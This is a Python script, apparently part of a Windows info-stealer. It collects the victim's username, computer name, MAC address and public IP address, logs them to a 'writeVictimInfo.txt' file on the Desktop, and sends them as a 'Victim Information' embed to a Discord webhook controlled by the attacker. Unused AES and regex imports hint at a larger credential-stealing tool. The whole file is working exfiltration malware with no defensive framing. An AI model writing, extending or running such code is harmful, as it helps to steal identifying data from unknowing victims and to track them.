import os
import requests
from re import findall
from Crypto.Cipher import AES
from getmac import get_mac_address
from pathlib import Path
from dotenv import load_dotenv

# Load environment variables
dotenv_path = Path('env/.env')
load_dotenv(dotenv_path=dotenv_path)
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

# Define environment keys
windows_enviroment = {
    'app_local': 'LOCALAPPDATA',
    'app_roaming': 'APPDATA',
    'computer_name': 'COMPUTERNAME',
    'user_path': 'HOMEPATH',
    'username': 'USERNAME'
}

def get_computer_information():
    # Retrieve environment variables
    computer_user_name = os.getenv(windows_enviroment.get('username'))
    computer_name = os.getenv(windows_enviroment.get('computer_name'))
    computer_mac_address = get_mac_address()
    ip_address = requests.get('https://api.ipify.org?format=json').json()['ip']

    # Set file path
    userprofile_path = os.path.join(os.environ["USERPROFILE"], "Desktop", 'writeVictimInfo.txt')

    # Ensure the directory exists
    os.makedirs(os.path.dirname(userprofile_path), exist_ok=True)

    # Write information to file
    with open(userprofile_path, 'a+', encoding="utf-8") as inforead:
        mem_history = inforead.read()
        inforead.seek(0)
        inforead.write(f'Username: {computer_user_name}\nComputer Name: {computer_name}\nComputer MAC Address: {computer_mac_address}\nIP Address: {ip_address}\n\n' + mem_history)

    # Prepare Discord embedded message
    discord_embeded = {
        "title": "Victim Information", 
        "description": "Computer Info", 
        "color": 0, 
        "fields": [
            {"name": "User", "value": computer_user_name},
            {"name": "Name", "value": computer_name},
            {"name": "MAC Address", "value": computer_mac_address},
            {"name": "IP Address", "value": ip_address}
        ]
    }

    latest_jsondata = {
        "content": "",
        "username": f"{computer_user_name} | {computer_name}",
        "embeds": [discord_embeded],
    }

    # Send POST request to Discord webhook URL
    response = requests.post(DISCORD_WEBHOOK_URL, json=latest_jsondata)
    if response.status_code != 204:
        print(f"Error sending to Discord: {response.status_code} - {response.text}")

